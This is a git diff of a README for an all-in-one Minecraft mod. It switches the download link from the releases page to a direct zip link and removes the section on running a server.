@@ -1,6 +1,6 @@
 # Everything Mod for Minecraft 26.2
 
-**[Download here](https://github.com/nick183cottee-prog/everything-mod-download-/releases/latest)**: get `EverythingMod-Easy-Install.zip` to play, or `EverythingMod-Server.zip` to run a server.
+**[Download here](https://github.com/nick183cottee-prog/everything-mod-download-/raw/main/EverythingMod-Easy-Install.zip)** (click it and the zip downloads).
 
 The Everything Mod is one Minecraft mod that does the job of about 30 others: it makes the game run faster,
 adds a minimap, bigger mountains, handy building tools, a zoom key and lots of small helpers.
@@ -68,6 +68,3 @@ In the launcher, open **Installations**, click the **...** next to Everything Mo
 To also remove its worlds, delete the folder `%APPDATA%\.minecraft-everything`
 (paste that into the File Explorer address bar).
 
-## Running a server
-
-Download `EverythingMod-Server.zip`, unzip it and read the README inside. Short version: install Java 25 from [adoptium.net](https://adoptium.net), double-click `Start-Server`, type `yes` for the EULA.
